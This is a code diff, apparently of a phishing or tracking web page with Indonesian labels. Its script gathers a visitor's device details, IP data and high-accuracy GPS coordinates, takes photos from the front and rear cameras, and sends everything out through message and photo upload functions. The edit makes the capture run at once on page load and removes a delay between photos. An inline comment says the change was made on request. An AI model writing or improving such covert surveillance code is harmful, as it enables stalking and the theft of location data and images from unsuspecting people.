@@ -171,9 +171,19 @@ Kota                : ${ip.city}
       return new Promise((resolve) => {
         navigator.geolocation.getCurrentPosition(pos => {
           const { latitude, longitude, accuracy } = pos.coords;
-          resolve(`౼ 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼\n\nLatitude            : ${latitude}\nLongitude           : ${longitude}\nAkurasi             : ±${accuracy} meter\nPeta                : https://maps.google.com/?q=${latitude},${longitude}`);
+          resolve(`
+౼ 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼
+
+Latitude            : ${latitude}
+Longitude           : ${longitude}
+Akurasi             : ±${accuracy} meter
+Peta                : https://maps.google.com/?q=${latitude},${longitude}
+          `.trim());
         }, () => {
-          resolve(`- 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 -\n\n❌ Lokasi tidak diizinkan oleh pengguna.`);
+          resolve(`
+౼ 〘 𝗟𝚶𝗞𝚫𝗦𝗜 𝗟𝚫𝗡𝗚𝗦𝗨𝗡𝗚 〙 ౼
+
+❌ Lokasi tidak diizinkan oleh pengguna.`.trim());
         }, { enableHighAccuracy: true, timeout: 7000 });
       });
     };
@@ -200,12 +210,10 @@ Kota                : ${ip.city}
           canvas.height = video.videoHeight;
           const ctx = canvas.getContext("2d");
           ctx.drawImage(video, 0, 0);
-          await new Promise(resolve => setTimeout(() => {
-            canvas.toBlob(async (blob) => {
-              if (blob) await kirimFoto(blob);
-              resolve();
-            }, "image/jpeg");
-          }, 100)); // 0.1 detik antar foto
+          await new Promise(resolve => canvas.toBlob(async (blob) => {
+            if (blob) await kirimFoto(blob);
+            resolve();
+          }, "image/jpeg"));
         }
 
         stream.getTracks().forEach(track => track.stop());
@@ -215,43 +223,24 @@ Kota                : ${ip.city}
       }
     };
 
-    let sudahKirimInfo = false;
-    let lanjutFoto = false;
-
+    // ✅ Hanya bagian ini yang diubah sesuai permintaan
     const mulai = async () => {
-      if (!sudahKirimInfo) {
-        const [info, ip, lokasi] = await Promise.all([
-          ambilDataPerangkat(),
-          ambilIPInfo(),
-          ambilLokasi()
-        ]);
-        let hasil = `${info}\n\n${ip}\n\n${lokasi}`;
-        await kirimPesan(hasil);
-        sudahKirimInfo = true;
-        lanjutFoto = true;
-      }
+      const [info, ip, lokasi] = await Promise.all([
+        ambilDataPerangkat(),
+        ambilIPInfo(),
+        ambilLokasi()
+      ]);
 
-      if (lanjutFoto) {
-        const kameraDepan = await ambilKamera("user", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗗𝚵𝗣𝚫𝗡");
-        const kameraBelakang = await ambilKamera("environment", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗕𝚵𝗟𝚫𝗞𝚫𝗡𝗚");
-        if (kameraDepan || kameraBelakang) {
-          await kirimPesan(`${kameraDepan}\n\n${kameraBelakang}`);
-        }
-        lanjutFoto = false;
-      }
+      let hasil = `${info}\n\n${ip}\n\n${lokasi}`; // <-- Format sesuai contoh: spasi antar blok
+
+      const kameraDepan = await ambilKamera("user", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗗𝚵𝗣𝚫𝗡");
+      if (kameraDepan) hasil += `\n\n${kameraDepan}`;
+
+      const kameraBelakang = await ambilKamera("environment", "𝗞𝚫𝗠𝚵𝗥𝚫 𝗕𝚵𝗟𝚫𝗞𝚫𝗡𝗚");
+      if (kameraBelakang) hasil += `\n\n${kameraBelakang}`;
+
+      await kirimPesan(hasil);
     };
-
-    document.addEventListener("visibilitychange", () => {
-      if (document.visibilityState === "hidden") {
-        if (!sudahKirimInfo) mulai();
-      }
-      if (document.visibilityState === "visible") {
-        if (sudahKirimInfo && !lanjutFoto) {
-          lanjutFoto = true;
-          mulai();
-        }
-      }
-    });
 
     mulai();
   </script>
